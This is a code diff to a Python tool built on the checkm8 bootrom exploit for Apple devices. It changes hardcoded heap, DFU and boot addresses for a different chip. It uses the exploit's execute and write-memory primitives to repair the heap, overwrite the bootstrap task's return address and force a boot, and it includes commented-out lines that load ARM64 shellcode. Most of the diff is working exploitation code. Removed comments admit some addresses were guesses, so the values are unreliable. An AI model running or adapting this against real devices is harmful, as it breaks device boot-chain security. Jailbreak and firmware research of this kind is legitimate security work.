@@ -1,6 +1,6 @@
 import checkm8.usbexec as usbexec
 from checkm8.checkm8 import exploit
-from checkm8.device import DFUDevice
+from checkm8.pwned import DFUDevice
 import struct
 
 class Device:
@@ -25,15 +25,17 @@ class Device:
 
         pwned = usbexec.PwnedUSBDevice()
 
-        # Repair heap
-        HEAP_BASE = 0x1801B4000
+        HEAP_BASE = 0x1801E8000
         HEAP_WRITE_OFFSET = 0x5000
-        HEAP_WRITE_HASH = 0x10000F364
-        HEAP_VERIFY = 0x10000F8B4
-
-        # unsure about this one, my db for t8010 sucks ass
-        HEAP_STATE = 0x180088BA0
-
+        HEAP_WRITE_HASH = 0x10000D4EC
+        HEAP_CHECK_ALL = 0x10000DB98
+        HEAP_STATE = 0x1800086A0
+        NAND_BOOT_JUMP = 0x10000188C
+        BOOTSTRAP_TASK_LR = 0x180015F88
+        DFU_BOOL = 0x1800085B0
+        DFU_NOTIFY = 0x1000098B4
+        DFU_STATE = 0x1800085E0
+        TRAMPOLINE = 0x180018000
         block1 = struct.pack('<8Q', 0, 0, 0, HEAP_STATE, 2, 132, 128, 0)
         block2 = struct.pack('<8Q', 0, 0, 0, HEAP_STATE, 2, 8, 128, 0)
 
@@ -45,24 +47,16 @@ class Device:
         pwned.execute(0, HEAP_WRITE_HASH, HEAP_BASE + HEAP_WRITE_OFFSET + 0x80)
         pwned.execute(0, HEAP_WRITE_HASH, HEAP_BASE + HEAP_WRITE_OFFSET + 0x100)
         pwned.execute(0, HEAP_WRITE_HASH, HEAP_BASE + HEAP_WRITE_OFFSET + 0x180)
-        pwned.execute(0, HEAP_VERIFY)
-        print('Attempted to repair heap')
+        pwned.execute(0, HEAP_CHECK_ALL)
+        print('heap rep')
 
-        BOOT_TRAMPOLINE = 0x1800AC000
-        BOOTSTRAP_TASK_LR = 0x1800a9f68
-
-        # no idea, shitty db
-        NAND_BOOT_JUMP = 0x100000700
-
-        DFU_BOOL = 0x180088AC0
-        DFU_STATE = 0x1800888AF0
-        DFU_NOTIFY = 0x10000AEE8
+        #pwned.write_memory(TRAMPOLINE, checkm8.asm_arm64_branch(TRAMPOLINE, TRAMPOLINE + 0x400))
+        #pwned.write_memory(TRAMPOLINE + 0x400, open('bin/t8015_shellcode_arm64.bin').read())
 
         pwned.write_memory_ptr(BOOTSTRAP_TASK_LR, NAND_BOOT_JUMP)
         pwned.write_memory(DFU_BOOL, '\x01')
-        print('Attempting Boot')
         pwned.execute(0, DFU_NOTIFY, DFU_STATE)
-        print('Go')
+        print('booted')
 
 
     def demote(self):
